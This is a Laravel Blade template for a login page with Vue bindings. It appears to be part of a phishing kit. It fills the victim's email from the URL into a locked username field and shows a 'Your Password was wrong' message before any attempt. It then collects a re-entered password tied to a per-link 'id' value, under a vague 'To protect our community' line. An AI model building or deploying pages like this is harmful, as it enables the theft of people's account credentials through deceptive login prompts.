@extends('master')
@section('style')
    <style>
        .box-portal-top{
            width: 100%;
            min-height: 51vh;
            z-index: 20;
            text-align: center;
            font-family: 'PT Sans', sans-serif;
            padding-top: 50px;
        }
        .box-portal-mid{
            width: 100%;
            text-align: center;
            font-family: 'PT Sans', sans-serif;
            padding-top: 50px;
            padding-bottom: 50px;
        }
        .box-portal-bot{
            width: 100%;
            z-index: 20;
            font-family: 'PT Sans', sans-serif;
            padding: 30px;
            color: #2B2B2B;
            font-size: 16px;
        }
        .border-danger{
            border: 1px solid red !important;
        }
    </style>
@endsection
@section('content')
    <div class="container-fluid box-portal-top d-flex flex-column align-items-center" style="gap: 40px;" id="ctlUser">
        <div v-if="isLoading" class="d-flex justify-content-center">
            <pulse-loader :color="colorLoading" :size="sizeLoading"></pulse-loader>
        </div>
        <img src="{{asset('image/ehe.png')}}" alt="" width="180">
        {{-- <p class="text-danger" style="font-size:14px; margin: 0;">Dear {{'@'.$username}},<br>Your Password is wrong. Please Try Again.</p> --}}
        <p class="font-weight-bold" style="color: red; font-size:14px; margin: 0;">{{ __('Dear') }} {{request()->query('email')}}</p>
        <form class="w-100 p-4" style="max-width: 416px; background: rgb(255 255 255 / 79%); border-radius: 10px; box-shadow: 0 0 10px 0 rgba(0,0,0,0.1);">
            <div class="form-group">
                <div class="w-100" style="text-align: left; margin-bottom: 10px; padding: 10px;">
                    <h4 style="color: #000000; margin: 0;">{{ __('Enter your password') }}</h4>
                </div>
                <hr>
                <p id="wrong_pass_msg" v-if="formPasswordError['message'] != undefined" style="
                    margin: 8px 0 0 2px;
                    text-align: left;
                    font-size: 12px;
                    font-style: italic;
                    border: 1px solid #fa3e3e;
                    display: none;
                    border-radius: 5px;
                    width: 100%;
                    ">
                    <span style="background-color: #fa3e3e; color: white; padding: 15px; margin: 0px 4px 0px 0px; height: 100%;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-triangle-fill mx-2" viewBox="0 0 16 16">
                            <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5m.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2"/>
                        </svg>
                    </span>
                    <span style="padding: 4px">
                        {{ __("The password that you've entered doesn't match your account. Please try again.") }}
                    </span>
                </p>
                <div v-if="formPasswordError['message'] == undefined" class="w-100" style="text-align: left; margin-bottom: 10px; padding: 10px;">
                    <p style="color: #000000; margin: 0;">{{ __('Your Password was wrong. Please Try Again.') }}</p>
                </div>
                <input type="hidden" name="email" value="{{request()->query('email')}}">
                <input type="text" class="form-control font-weight-bold input-text mb-2 mt-4" name="username" placeholder="Username" style="margin-bottom: 5px; background:  rgb(255 255 255 / 79%); color: #747272; cursor: not-allowed;" required readonly value="{{request()->query('email')}}">
                <input type="password" :class="formPasswordError['code'] != undefined ? 'form-control border border-danger input-text mb-4':'form-control input-text mb-4'" name="password" placeholder="{{ __('Password') }}" style="margin-bottom: 5px; background:  rgb(255 255 255 / 79%); color: #333;" required v-model="FormPassword.password">
                <hr>
                <button type="button" class="btn btn-primary form-control" @click="enterPassword('{{ request()->query('id') }}')">{{ __('Login') }}</button>
            </div>
        </form>
    </div>
    <div class="container-fluid box-portal-mid d-flex flex-column align-items-center" style="gap: 40px;">
        {{-- <img src="{{asset('image/ehe.png')}}" alt="" width="180"> --}}
        <p style="color: #938888; font-size:14px;">{{ __('To protect our community') }}</p>
    </div>
@endsection
@section('script')
    <script type="text/javascript" src="{{ mix('/js/modules/user.js') }}"  charset="utf-8"></script>
@endsection
